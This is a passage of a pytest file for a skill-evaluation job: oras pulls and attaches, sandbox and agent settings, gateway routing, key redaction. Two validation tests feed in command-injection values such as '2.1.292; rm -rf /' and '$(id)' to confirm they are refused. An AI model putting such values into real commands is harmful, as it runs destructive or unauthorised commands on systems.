    assert 0 < len(json.loads(text)["findings"]) < 30


def eks_of(command: list[str]) -> list[str]:
    """Return the values of the ``--ek`` flags of a validate command."""
    return [command[i + 1] for i, arg in enumerate(command) if arg == "--ek"]


def test_commands(termination, monkeypatch):
    """oras and the full validate run get the arguments the contract promises."""
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    oras = fake.calls[0]
    evaluator = fake.validates()[-1]
    assert oras[:3] == ["oras", "pull", ENV["SKILL_REF"]]
    assert "--plain-http" in oras
    assert evaluator[2].endswith("/skills/acme")
    for flag, value in [
        ("--tiers", "1,2,3"),
        ("--agents", "claude-code"),
        ("--env-mode", "ack"),
        ("--agent-model", "claude-code=claude-haiku-5-5"),
        ("--n-attempts", "2"),
        ("--n-concurrent", "2"),
        ("--timeout-multiplier", "2"),
    ]:
        assert evaluator[evaluator.index(flag) + 1] == value
    assert "--no-autopilot" in evaluator
    # validate has no --override-cpus/--override-memory-mb: the size travels in the environment.
    assert not {"--override-cpus", "--override-memory-mb", "--progress"} & set(evaluator)
    env = fake.envs["validate"]
    assert (env["HARBOR_SANDBOX_CPUS"], env["HARBOR_SANDBOX_MEMORY_MB"]) == ("1", "2048")
    # No registry, no builder, no pull secret: the sandbox runs the generic image.
    assert eks_of(evaluator) == ["namespace=skill-ci"]
    assert env["HARBOR_SANDBOX_IMAGE"] == skill_eval.DEFAULT_SANDBOX_IMAGE


def run_validate(monkeypatch, **settings: str) -> tuple[list[str], dict[str, str]]:
    """Run main() with extra Job env and return the full validate command and its env."""
    for name, value in settings.items():
        monkeypatch.setenv(name, value)
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    return fake.validates()[-1], fake.envs["validate"]


def test_sandbox_image_from_the_job(termination, monkeypatch):
    """SANDBOX_IMAGE and SANDBOX_PULL_SECRETS from the Job reach the sandbox environment."""
    command, env = run_validate(
        monkeypatch,
        SANDBOX_IMAGE="ghcr.io/dirien/skill-ci-sandbox:0.7.0",
        SANDBOX_PULL_SECRETS="ghcr, other",
    )
    assert env["HARBOR_SANDBOX_IMAGE"] == "ghcr.io/dirien/skill-ci-sandbox:0.7.0"
    assert eks_of(command) == ["namespace=skill-ci", "image_pull_secret=ghcr,other"]
    # Nothing in the command or environment points at a registry or a builder.
    assert not any("registry" in value or "skip_image_check" in value for value in eks_of(command))


def test_sandbox_image_wins_over_a_stray_harbor_variable(termination, monkeypatch):
    """The Job's SANDBOX_IMAGE decides, not a HARBOR_SANDBOX_IMAGE left in the environment."""
    _, env = run_validate(
        monkeypatch, SANDBOX_IMAGE="reg/sandbox:2", HARBOR_SANDBOX_IMAGE="reg/other:1"
    )
    assert env["HARBOR_SANDBOX_IMAGE"] == "reg/sandbox:2"


def test_bring_your_own_builder(termination, monkeypatch):
    """With TASK_IMAGE_REGISTRY the trials build task images and no sandbox image is set."""
    command, env = run_validate(
        monkeypatch,
        TASK_IMAGE_REGISTRY="registry.example.com/evals",
        TASK_IMAGE_PULL_SECRET="regcred",
        SANDBOX_IMAGE="ghcr.io/dirien/skill-ci-sandbox:0.7.0",
        HARBOR_SANDBOX_IMAGE="ghcr.io/dirien/skill-ci-sandbox:0.7.0",
        HARBOR_BUILDKIT_ADDRESS="tcp://buildkitd.example:1234",
    )
    assert eks_of(command) == [
        "namespace=skill-ci",
        "registry=registry.example.com/evals",
        "image_pull_secret=regcred",
        "skip_image_check=false",
    ]
    assert "HARBOR_SANDBOX_IMAGE" not in env
    assert env["HARBOR_BUILDKIT_ADDRESS"] == "tcp://buildkitd.example:1234"  # the builder's address


def test_building_without_a_pull_secret(termination, monkeypatch):
    """A registry that needs no pull secret adds none."""
    command, _ = run_validate(monkeypatch, TASK_IMAGE_REGISTRY="registry.example.com/evals")
    assert eks_of(command) == [
        "namespace=skill-ci",
        "registry=registry.example.com/evals",
        "skip_image_check=false",
    ]


@pytest.mark.parametrize(
    ("settings", "message"),
    [
        ({"SANDBOX_IMAGE": "not an image"}, "SANDBOX_IMAGE must be an image reference"),
        ({"SANDBOX_IMAGE": "x;rm"}, "SANDBOX_IMAGE must be an image reference"),
        ({"SANDBOX_PULL_SECRETS": "Good,BAD_NAME"}, "SANDBOX_PULL_SECRETS must list Secret names"),
    ],
)
def test_bad_sandbox_settings(settings, message):
    """A sandbox image or pull secret that cannot be one fails before anything runs."""
    with pytest.raises(skill_eval.EvalError, match=message):
        skill_eval.load_config({**ENV, **settings})


def test_defaults_do_not_need_a_registry_or_a_builder():
    """The default configuration builds nothing and names no registry credentials."""
    config = skill_eval.load_config(ENV)
    assert not skill_eval.builds_task_images(config)
    assert config["TASK_IMAGE_REGISTRY"] == config["TASK_IMAGE_PULL_SECRET"] == ""
    assert config["SANDBOX_PULL_SECRETS"] == ""
    assert config["SANDBOX_IMAGE"] == skill_eval.DEFAULT_SANDBOX_IMAGE


def test_warm_pool_and_eval_name_reach_harbor(termination, monkeypatch):
    """SANDBOX_WARM_POOL becomes HARBOR_SANDBOX_WARM_POOL; the profile sizes the sandbox."""
    _, env = run_validate(
        monkeypatch,
        SANDBOX_WARM_POOL=" default ",
        SKILLEVAL_NAME="acme-v1-0-0-claude-code-claude-haiku-5-5",
        SANDBOX_CPUS="2",
    )
    assert env["HARBOR_SANDBOX_WARM_POOL"] == "default"
    assert env["SKILLEVAL_NAME"] == "acme-v1-0-0-claude-code-claude-haiku-5-5"
    assert "HARBOR_SANDBOX_CPUS" not in env and "HARBOR_SANDBOX_MEMORY_MB" not in env
    assert env["HARBOR_SANDBOX_IMAGE"] == skill_eval.DEFAULT_SANDBOX_IMAGE


@pytest.mark.parametrize(
    ("settings", "expected"),
    [
        ({}, None),  # no profile: a bare Sandbox per trial
        ({"HARBOR_SANDBOX_WARM_POOL": "stray"}, None),  # the Job's SANDBOX_WARM_POOL decides
        (
            {"SANDBOX_WARM_POOL": "default", "TASK_IMAGE_REGISTRY": "registry.example.com/x"},
            None,  # task images are built: a warm pool cannot run them
        ),
    ],
)
def test_no_warm_pool(settings, expected):
    """Without a usable warm pool the size variables are set as before."""
    env = skill_eval.tool_env({**ENV, **settings})
    assert env.get("HARBOR_SANDBOX_WARM_POOL") == expected
    assert (env["HARBOR_SANDBOX_CPUS"], env["HARBOR_SANDBOX_MEMORY_MB"]) == ("1", "2048")


def test_bad_warm_pool_name():
    """A warm pool that cannot be an object name fails before anything runs."""
    with pytest.raises(skill_eval.EvalError, match="SANDBOX_WARM_POOL must be"):
        skill_eval.load_config({**ENV, "SANDBOX_WARM_POOL": "Not_A_Name"})


def test_sandbox_size_follows_the_job_env(termination, monkeypatch):
    """SANDBOX_CPUS and SANDBOX_MEMORY_MB from the Job become the sandbox size variables."""
    monkeypatch.setenv("SANDBOX_CPUS", "2")
    monkeypatch.setenv("SANDBOX_MEMORY_MB", "3072")
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    env = fake.envs["validate"]
    assert (env["HARBOR_SANDBOX_CPUS"], env["HARBOR_SANDBOX_MEMORY_MB"]) == ("2", "3072")


def test_attach_command(termination, monkeypatch):
    """The combined report and the Tier 3 files are attached as a typed referrer."""
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    attach = fake.calls[-1]
    assert attach[:4] == ["oras", "attach", "--artifact-type", skill_eval.REPORT_TYPE]
    assert "--plain-http" in attach
    annotations = [attach[i + 1] for i, arg in enumerate(attach) if arg == "--annotation"]
    assert annotations == [
        "skillci.dev/model=claude-haiku-5-5",
        "skillci.dev/agent=claude-code",
        "skillci.dev/agent-version=2.1.292",
        "skillci.dev/lift=+0.59",
        "skillci.dev/publication=passed",
        f"skillci.dev/trials={TRIALS}",
    ]
    subject = attach.index(ENV["SKILL_REF"])
    assert attach[subject + 1 :] == [
        "report.html:text/html",
        "result.json:application/json",
        "BENCHMARK.md:text/markdown",
        "validate.json:application/json",
        "tier3.html:text/html",
    ]
    assert fake.attach_cwd is not None
    assert fake.attach_cwd.name == "report"
    assert "combined" in fake.bundle_text["report.html"]
    assert "tier 3" in fake.bundle_text["tier3.html"]
    assert "agents" in json.loads(fake.bundle_text["result.json"])  # the Tier 3 result


def test_termination_message_with_report_fits(tmp_path):
    """The payload with a report digest stays far below the 4 KB limit."""
    path = tmp_path / "log"
    skill_eval.write_termination(GOOD_PAYLOAD, str(path))
    assert len(path.read_text().encode()) < skill_eval.MAX_MESSAGE_BYTES


def attempts_block(*cases: list[float]) -> dict:
    """Build one ``pass_at_k.<arm>`` block: one case per argument, one row per attempt."""
    return {
        "cases": {
            f"case-{i}": {"attempts": [{"attempt": n, "score": s} for n, s in enumerate(c, 1)]}
            for i, c in enumerate(cases)
        }
    }


def with_trials(entry: dict, with_skill: dict, without_skill: dict) -> dict:
    """Return an ``agents.<name>`` entry that carries per-trial scores."""
    return {**entry, "pass_at_k": {"with_skill": with_skill, "without_skill": without_skill}}


def test_samples_are_the_per_trial_scores(termination, monkeypatch):
    """3 cases x 3 attempts give 9 scores per arm, rounded to two decimals."""
    entry = with_trials(
        agent_entry(0.9, 0.3667),
        attempts_block([0.95, 0.9, 0.85], [0.95, 0.95, 0.8], [0.9, 0.95, 0.85]),
        attempts_block([0.365, 0.3829, 0.3517], [0.3, 0.4, 0.35], [0.36, 0.37, 0.38]),
    )
    monkeypatch.setattr(skill_eval.subprocess, "run", FakeRun({"agents": {"claude-code": entry}}))
    assert skill_eval.main() == 0
    samples = termination()["samples"]
    assert samples["withSkill"] == [0.95, 0.9, 0.85, 0.95, 0.95, 0.8, 0.9, 0.95, 0.85]
    assert samples["withoutSkill"][:3] == [0.36, 0.38, 0.35]
    assert len(samples["withoutSkill"]) == 9


@pytest.mark.parametrize(
    ("entry", "expected"),
    [
        (agent_entry(0.9, 0.3), {}),  # older SkillEvaluator: no per-trial block
        (with_trials(agent_entry(0.9, 0.3), attempts_block([0.9]), attempts_block()), {}),
        (
            with_trials(agent_entry(0.9, 0.3), attempts_block([0.9, None]), attempts_block([0.3])),
            {"withSkill": [0.9], "withoutSkill": [0.3]},
        ),
    ],
    ids=["no block", "one arm empty", "missing score skipped"],
)
def test_samples_are_optional(entry, expected, termination, monkeypatch):
    """Without usable per-trial scores the message has no ``samples``."""
    monkeypatch.setattr(skill_eval.subprocess, "run", FakeRun({"agents": {"claude-code": entry}}))
    assert skill_eval.main() == 0
    assert termination().get("samples", {}) == expected


def test_samples_are_capped_and_the_message_fits(tmp_path):
    """Even a huge dataset keeps the message under 4 KB."""
    many = [[0.95] * 40] * 40
    entry = with_trials(agent_entry(0.95, 0.36), attempts_block(*many), attempts_block(*many))
    samples = {
        "withSkill": skill_eval.trial_scores(entry, "with_skill"),
        "withoutSkill": skill_eval.trial_scores(entry, "without_skill"),
    }
    payload = {**GOOD_PAYLOAD, "samples": samples}
    path = tmp_path / "log"
    skill_eval.write_termination(payload, str(path))
    text = path.read_text()
    assert len(text.encode()) < skill_eval.MAX_MESSAGE_BYTES
    assert len(json.loads(text)["samples"]["withSkill"]) == skill_eval.MAX_SAMPLES


@pytest.mark.parametrize(
    ("env", "message"),
    [
        ({k: v for k, v in ENV.items() if k != "MODEL"}, "missing required env: MODEL"),
        ({**ENV, "ATTEMPTS": "zero"}, "ATTEMPTS must be a positive integer"),
        ({**ENV, "SANDBOX_CPUS": "0"}, "SANDBOX_CPUS must be a positive integer"),
        ({**ENV, "SANDBOX_MEMORY_MB": "2g"}, "SANDBOX_MEMORY_MB must be a positive integer"),
        ({**ENV, "TIMEOUT_MULTIPLIER": "fast"}, "TIMEOUT_MULTIPLIER must be a positive number"),
        ({**ENV, "TIMEOUT_MULTIPLIER": "0"}, "TIMEOUT_MULTIPLIER must be a positive number"),
    ],
)
def test_bad_config(env, message):
    """Bad configuration fails before anything runs."""
    with pytest.raises(skill_eval.EvalError, match=message):
        skill_eval.load_config(env)


@pytest.mark.parametrize(
    ("status", "expected"),
    [
        ("pass", "passed"),
        ("neutral", "passed"),
        ("fail", "failed"),
        ("incomplete", "incomplete"),
        ("surprise", "incomplete"),
        (None, "incomplete"),
    ],
)
def test_publication_of(status, expected):
    """SkillEvaluator's publication.status is mapped; unknown values never read as passed."""
    content = {} if status is None else {"publication": {"status": status}}
    assert skill_eval.publication_of(content) == expected


def test_publication_of_older_field():
    """A report with only the flat publication_status is still understood."""
    assert skill_eval.publication_of({"publication_status": "pass"}) == "passed"


@pytest.mark.parametrize(
    ("results", "expected"),
    [
        ([validator("a"), validator("b")], "passed"),
        ([validator("a"), validator("b", "failed")], "failed"),
        ([validator("a", "incomplete"), validator("b", "failed")], "failed"),
        ([validator("a"), validator("b", "incomplete")], "incomplete"),
        ([validator("a", incomplete=["semgrep"])], "incomplete"),
        ([validator("a", "skipped")], "incomplete"),
        ([validator("a"), validator("b", "skipped")], "passed"),
        ([], "incomplete"),
    ],
)
def test_tier_status(results, expected):
    """A tier fails on any failed check and is incomplete without trustworthy evidence."""
    assert skill_eval.tier_status({"results": results}, 1) == expected


def test_truncated_message(tmp_path):
    """Long error messages are cut to fit the 4 KB termination message."""
    path = tmp_path / "log"
    skill_eval.write_termination({"error": "x" * 10_000}, str(path))
    text = path.read_text()
    assert len(text.encode()) <= skill_eval.MAX_MESSAGE_BYTES
    assert json.loads(text)["error"].endswith("...")


def test_secrets_are_redacted(termination, monkeypatch):
    """API key values never reach the termination message."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-secret-value")

    def boom(*_: Any, **__: Any) -> None:
        raise RuntimeError("failed with sk-secret-value")

    monkeypatch.setattr(skill_eval.subprocess, "run", boom)
    assert skill_eval.main() == 1
    assert "sk-secret-value" not in json.dumps(termination())


def test_no_eval_dataset_keeps_the_gate_findings(termination, monkeypatch):
    """The error after the gate carries its tiers and its (redacted) findings."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-leak-123")
    gate = report(
        validator("security", "incomplete", errors=["scan saw sk-leak-123"], incomplete=["x"]),
        validator("similarity", tier=2),
        publication="incomplete",
    )
    monkeypatch.setattr(skill_eval.subprocess, "run", FakeRun(GOOD, gate=gate, evals=None))
    assert skill_eval.main() == 1
    written = termination()
    assert written["error"] == NO_DATASET
    assert written["tiers"] == {"tier1": "incomplete", "tier2": "passed", "tier3": "skipped"}
    assert written["findings"] == ["tier1/security: scan saw [redacted]"]


def test_unexpected_error_after_the_gate_keeps_the_tiers(termination, monkeypatch):
    """Any exception once Tier 3 started still reports the gate, with Tier 3 incomplete."""
    fake = FakeRun(GOOD)

    def run(cmd: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        if cmd[:2] == ["skillevaluator", "validate"] and "--results-dir" in cmd:
            raise OSError("no space left on device")
        return fake(cmd, **kwargs)

    monkeypatch.setattr(skill_eval.subprocess, "run", run)
    assert skill_eval.main() == 1
    assert termination() == {
        "error": "no space left on device",
        "tiers": {"tier1": "passed", "tier2": "passed", "tier3": "incomplete"},
        "findings": [],
        "report": REPORT,
    }
    # Tier 3 left no run directory: the gate's report is attached, without trials.
    (attach,) = fake.report_attaches()
    assert "skillci.dev/trials-withheld=no-trials" in attach


def test_oversized_error_keeps_the_tiers(tmp_path):
    """A long error after the gate loses findings, then error text, never the tiers."""
    tiers = {"tier1": "passed", "tier2": "passed", "tier3": "skipped"}
    path = tmp_path / "log"
    payload = {"error": "e" * 10_000, "tiers": tiers, "findings": ["tier1/x: " + "y" * 190] * 5}
    skill_eval.write_termination(payload, str(path))
    written = json.loads(path.read_text())
    assert len(path.read_text().encode()) <= skill_eval.MAX_MESSAGE_BYTES
    assert written["tiers"] == tiers
    assert written["findings"] == []
    assert written["error"].endswith("...")


def test_secrets_are_redacted_from_findings(termination, monkeypatch):
    """A key that a scanner echoes into a finding is removed from the message."""
    leak = report(validator("pii", "failed", [finding("Key", "found sk-leak-123")]))
    monkeypatch.setenv("OPENAI_API_KEY", "sk-leak-123")
    monkeypatch.setattr(skill_eval.subprocess, "run", FakeRun(GOOD, gate=leak))
    assert skill_eval.main() == 0
    assert "sk-leak-123" not in json.dumps(termination())


def test_attach_is_retried(termination, monkeypatch, sleeps):
    """A transient registry error on attach is retried and the report digest still arrives."""
    fake = FakeRun(GOOD, attach_failures=1)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert termination()["report"] == REPORT
    assert len(fake.report_attaches()) == 2
    assert sleeps == [2]


def test_attach_gives_up_after_three_retries(termination, monkeypatch, sleeps):
    """A permanent attach error costs four calls and never fails the eval."""
    fake = FakeRun(GOOD, attach_exit=1)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert "report" not in termination()
    assert len(fake.report_attaches()) == 4
    assert sleeps == [2, 5, 10]


def test_tier3_names_the_llm_provider(termination, monkeypatch):
    """With several provider keys, Tier 3 still gets an explicit SKILL_EVAL_LLM_PROVIDER."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test-openai")
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert fake.envs["validate"]["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"


@pytest.mark.parametrize(
    ("env", "expected"),
    [
        ({}, "2.1.292"),
        ({"AGENT": "codex"}, "0.161.0"),
        ({"AGENT": "opencode"}, "1.19.1"),
        ({"AGENT": "codex", "AGENT_VERSION": "0.170.1"}, "0.170.1"),
        ({"AGENT_VERSION": ""}, "2.1.292"),
        ({"AGENT": "gemini"}, ""),
    ],
)
def test_agent_version_defaults(env, expected):
    """AGENT_VERSION wins; otherwise the agent's default pin applies; unknown agents have none."""
    environ = {**ENV, "MODEL": "m", **env}
    if environ["AGENT"] == "opencode":
        environ["MODEL"] = "anthropic/claude-sonnet-5-5"
    assert skill_eval.load_config(environ)["AGENT_VERSION"] == expected


@pytest.mark.parametrize("version", ["2.1.292; rm -rf /", "$(id)", "1 2", "-1.0", "1.0-", "a" * 70])
def test_bad_agent_version(version):
    """The version ends up in `npm install -g pkg@<version>`, so odd characters are refused."""
    with pytest.raises(skill_eval.EvalError, match="AGENT_VERSION must be a release"):
        skill_eval.load_config({**ENV, "AGENT_VERSION": version})


def test_default_pins_match_skillevaluator():
    """The claude-code and codex defaults are the pins SkillEvaluator ships."""
    harbor_runner = pytest.importorskip("skillevaluator.tier3.harbor.runner")
    assert skill_eval.DEFAULT_AGENT_VERSIONS["claude-code"] == harbor_runner._CLAUDE_CODE_VERSION
    assert skill_eval.DEFAULT_AGENT_VERSIONS["codex"] == harbor_runner._CODEX_VERSION
    assert "opencode" not in harbor_runner._HARBOR_AGENT_KWARGS  # upstream leaves it unpinned


def test_agent_version_reaches_skillevaluator(termination, monkeypatch):
    """The requested release is the SKILLEVALUATOR_AGENT_VERSION of every SkillEvaluator command."""
    monkeypatch.setenv("AGENT_VERSION", "2.1.300")
    fake = FakeRun(GOOD, trial_versions=["2.1.300", "2.1.300"])
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert fake.envs["validate"]["SKILLEVALUATOR_AGENT_VERSION"] == "2.1.300"
    assert termination()["agentVersion"] == "2.1.300"


@pytest.mark.parametrize(
    ("trial_versions", "expected"),
    [
        (["2.1.292", "2.1.292"], "2.1.292"),
        (["2.1.299", "2.1.299", "2.1.292"], "2.1.299"),  # the trials win over the request
        (["unknown", "not a version"], "2.1.292"),  # unusable values fall back to the request
        ([], "2.1.292"),  # jobs not kept
    ],
)
def test_agent_version_is_what_the_trials_ran(trial_versions, expected, termination, monkeypatch):
    """The termination message reports the release the trials ran, else the requested one."""
    fake = FakeRun(GOOD, trial_versions=trial_versions)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert termination()["agentVersion"] == expected


def test_rejected_run_reports_the_requested_agent_version(termination, monkeypatch):
    """Tier 3 never runs for a rejected skill, so the version is the requested one."""
    fake = FakeRun(GOOD, gate=TIER2_FAILED)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert termination()["agentVersion"] == "2.1.292"


def test_codex_gets_the_openai_endpoint(termination, monkeypatch):
    """Codex gets OPENAI_BASE_URL next to its key; the judge stays Anthropic."""
    monkeypatch.setenv("AGENT", "codex")
    monkeypatch.setenv("MODEL", "openai/gpt-6.1-sol")
    monkeypatch.delenv("OPENAI_BASE_URL", raising=False)
    fake = FakeRun({"agents": {"codex": agent_entry(0.9, 0.4, "openai/gpt-6.1-sol")}})
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    env = fake.envs["validate"]
    assert env["OPENAI_BASE_URL"] == "https://api.openai.com/v1"
    assert env["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"
    assert env["SKILLEVALUATOR_AGENT_VERSION"] == "0.161.0"
    evaluator = fake.validates()[-1]
    assert evaluator[evaluator.index("--agent-model") + 1] == "codex=openai/gpt-6.1-sol"
    assert termination()["agentVersion"] == "0.161.0"


def test_codex_keeps_a_custom_endpoint(monkeypatch):
    """An OPENAI_BASE_URL from the Job is not replaced."""
    env = skill_eval.tool_env(
        {**ENV, "AGENT": "codex", "OPENAI_API_KEY": "k", "OPENAI_BASE_URL": "https://gw/v1"}
    )
    assert env["OPENAI_BASE_URL"] == "https://gw/v1"


OLLAMA = {"AGENT": "opencode", "MODEL": "ollama-cloud/gpt-oss:120b", "OLLAMA_API_KEY": "ollama-key"}


def test_opencode_native_anthropic_route(monkeypatch):
    """OpenCode on an Anthropic model uses the Anthropic key and no gateway."""
    environ = {**ENV, "AGENT": "opencode", "MODEL": "anthropic/claude-sonnet-5-5"}
    route = skill_eval.agent_route("opencode", environ["MODEL"], environ)
    assert route == skill_eval.AgentRoute("anthropic/claude-sonnet-5-5")
    env = skill_eval.tool_env({**environ, "ANTHROPIC_API_KEY": "a"})
    assert "SKILLEVALUATOR_OPENCODE_GATEWAY" not in env
    assert env["SKILLEVALUATOR_AGENT_VERSION"] == "1.19.1"


def test_opencode_gateway_route():
    """An Ollama Cloud model runs as openai/<id> against the Ollama endpoint with its own key."""
    route = skill_eval.agent_route("opencode", OLLAMA["MODEL"], OLLAMA)
    assert route.gateway
    assert route.model == "openai/gpt-oss:120b"
    assert route.env == {
        "OPENAI_API_KEY": "ollama-key",
        "OPENAI_BASE_URL": "https://ollama.com/v1",
        "SKILLEVALUATOR_OPENCODE_GATEWAY": "1",
    }


def test_opencode_gateway_keeps_judge_and_embeddings(monkeypatch):
    """The gateway key replaces OPENAI_API_KEY for the agent only: judge and Tier 2 stay put."""
    environ = {**ENV, **OLLAMA, "ANTHROPIC_API_KEY": "a", "OPENAI_API_KEY": "real-openai"}
    env = skill_eval.tool_env(environ)
    assert env["OPENAI_API_KEY"] == "ollama-key"
    assert env["OPENAI_BASE_URL"] == "https://ollama.com/v1"
    assert env["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"
    assert env["SKILL_EVAL_EMBEDDING_PROVIDER"] == "openai-compatible"
    assert env["SKILL_EVAL_EMBEDDING_API_KEY"] == "real-openai"
    assert env["SKILL_EVAL_EMBEDDING_BASE_URL"] == "https://api.openai.com/v1"
    assert env["SKILL_EVAL_EMBEDDING_MODEL"] == "text-embedding-3-small"
    assert env["SKILLEVALUATOR_OPENCODE_GATEWAY"] == "1"


def test_opencode_gateway_embeddings_fall_back_to_nvidia():
    """Without a real OpenAI key, Tier 2 embeds through NVIDIA Build, not the gateway key."""
    env = skill_eval.tool_env({**ENV, **OLLAMA, "ANTHROPIC_API_KEY": "a", "NVIDIA_API_KEY": "n"})
    assert env["SKILL_EVAL_EMBEDDING_PROVIDER"] == "nv_build"
    env = skill_eval.tool_env({**ENV, **OLLAMA, "ANTHROPIC_API_KEY": "a"})
    assert "SKILL_EVAL_EMBEDDING_PROVIDER" not in env


@pytest.mark.parametrize(
    ("agent", "model", "environ", "message"),
    [
        ("opencode", "gpt-oss", {}, "needs a <provider>/<model> model"),
        ("opencode", "mystery/m", {}, "provider 'mystery' is not supported"),
        ("opencode", "ollama-cloud/glm-5.3", {}, "needs OLLAMA_API_KEY"),
        ("opencode", "openrouter/x/y", {"OLLAMA_API_KEY": "k"}, "needs OPENROUTER_API_KEY"),
    ],
)
def test_bad_opencode_route(agent, model, environ, message):
    """An OpenCode model that cannot run fails before any work is done."""
    with pytest.raises(skill_eval.EvalError, match=message):
        skill_eval.agent_route(agent, model, environ)


OPENROUTER = {"OPENROUTER_API_KEY": "or-key"}


def key_lookup(answer: Any) -> tuple[list, Any]:
    """Return the requests seen and a fake ``fetch`` that answers OpenRouter's GET /key."""
    seen: list = []

    def fetch(request):
        seen.append(request)
        if isinstance(answer, Exception):
            raise answer
        return answer if isinstance(answer, bytes) else json.dumps(answer).encode()

    return seen, fetch


@pytest.mark.parametrize(
    ("answer", "fails"),
    [
        ({"data": {"is_provisioning_key": True}}, True),
        ({"data": {"is_provisioning_key": False}}, False),
        ({"data": {}}, False),
        ({"error": {"code": 401}}, False),
        (b"not json", False),
        (skill_eval.urllib.error.URLError("offline"), False),
        (TimeoutError("slow"), False),
    ],
)
def test_check_gateway_key(answer, fails):
    """Only a confirmed provisioning key stops the run; anything unclear goes on to the trials."""
    seen, fetch = key_lookup(answer)
    if fails:
        with pytest.raises(skill_eval.EvalError, match="provisioning key"):
            skill_eval.check_gateway_key("openrouter/qwen/qwen3.8-flash", OPENROUTER, fetch)
    else:
        skill_eval.check_gateway_key("openrouter/qwen/qwen3.8-flash", OPENROUTER, fetch)
    assert seen[0].full_url == "https://openrouter.ai/api/v1/key"
    assert seen[0].get_header("Authorization") == "Bearer or-key"


@pytest.mark.parametrize("model", ["ollama-cloud/gpt-oss:120b", "anthropic/claude-haiku-5-5"])
def test_check_gateway_key_only_for_openrouter(model):
    """Other providers have no key types to tell apart, so nothing is fetched."""
    seen, fetch = key_lookup({"data": {"is_provisioning_key": True}})
    skill_eval.check_gateway_key(model, OPENROUTER, fetch)
    assert seen == []


def test_provisioning_key_fails_before_any_work(termination, monkeypatch):
    """A provisioning key ends the run with a clear error, before the pull and every tier."""
    monkeypatch.setenv("AGENT", "opencode")
    monkeypatch.setenv("MODEL", "openrouter/qwen/qwen3.8-flash")
    monkeypatch.setenv("OPENROUTER_API_KEY", "or-key")

    class Response:
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def read(self):
            return b'{"data": {"is_provisioning_key": true}}'

    monkeypatch.setattr(skill_eval.urllib.request, "urlopen", lambda req, timeout: Response())
    fake = FakeRun({})
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 1
    assert "provisioning key" in termination()["error"]
    assert fake.calls == []


def test_opencode_gateway_run(termination, monkeypatch):
    """A gateway run passes the OpenAI-form model to SkillEvaluator and reports the real one."""
    for key, value in OLLAMA.items():
        monkeypatch.setenv(key, value)
    monkeypatch.setenv("OPENAI_API_KEY", "real-openai")
    fake = FakeRun({"agents": {"opencode": agent_entry(0.8, 0.3, "openai/gpt-oss:120b")}})
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    evaluator = fake.validates()[-1]
    assert evaluator[evaluator.index("--agent-model") + 1] == "opencode=openai/gpt-oss:120b"
    message = termination()
    assert message["model"] == "ollama-cloud/gpt-oss:120b"
    assert message["agentVersion"] == "1.19.1"
    assert fake.envs["validate"]["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"


def test_gateway_keys_are_redacted(termination, monkeypatch):
    """The Ollama and OpenRouter keys never reach the log or the message."""
    assert {"OLLAMA_API_KEY", "OPENROUTER_API_KEY"} <= set(skill_eval.SECRET_ENV)
    monkeypatch.setenv("OLLAMA_API_KEY", "ollama-secret")
    assert skill_eval.redact("failed with ollama-secret") == "failed with [redacted]"


def test_gateway_environment_resolves_in_skillevaluator():
    """SkillEvaluator accepts the judge and embedding providers a gateway run gets."""
    config = pytest.importorskip("skillevaluator.provider_config")
    environ = {**ENV, **OLLAMA, "ANTHROPIC_API_KEY": "a", "OPENAI_API_KEY": "real-openai"}
    env = skill_eval.tool_env(environ)
    embedding = config.resolve_embedding_provider(env)
    assert (embedding.provider, embedding.api_key) == ("openai-compatible", "real-openai")
    assert embedding.base_url == "https://api.openai.com/v1"
    assert config.resolve_llm_provider(env).provider == "anthropic"


EVAL_NAME = "acme-v1-0-0-claude-code-2-1-292-claude-haiku-5-5"
TRIAL_TIMES = [
    ("with-skill", "rn-basic__sryqofs", "2026-10-30T14:13:45.009297Z", "2026-10-30T14:21:18Z"),
    ("without-skill", "rn-basic__BQbpoR9", "2026-10-30T14:13:46Z", None),
]


def annotations_of(command: list[str]) -> list[str]:
    """Return the values of the ``--annotation`` flags of an oras command."""
    return [command[i + 1] for i, arg in enumerate(command) if arg == "--annotation"]


def run_main(monkeypatch, fake: FakeRun, code: int = 0, **settings: str) -> None:
    """Run main() with ``fake`` and extra Job env, expecting exit ``code``."""
    for name, value in settings.items():
        monkeypatch.setenv(name, value)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == code


def test_bundle_is_attached_before_the_report(termination, monkeypatch, modules):
    """The trial bundle is attached first; the report names its digest."""
    fake = FakeRun(GOOD)
    run_main(monkeypatch, fake, SKILLEVAL_NAME=EVAL_NAME, SKILL_VERSION="v1.0.0")
    assert [a["type"] for a in fake.attaches] == [skill_eval.BUNDLE_TYPE, skill_eval.REPORT_TYPE]
    assert EVENTS[-3:] == [
        "bundle.build",
        f"attach {skill_eval.BUNDLE_TYPE}",
        f"attach {skill_eval.REPORT_TYPE}",
    ]
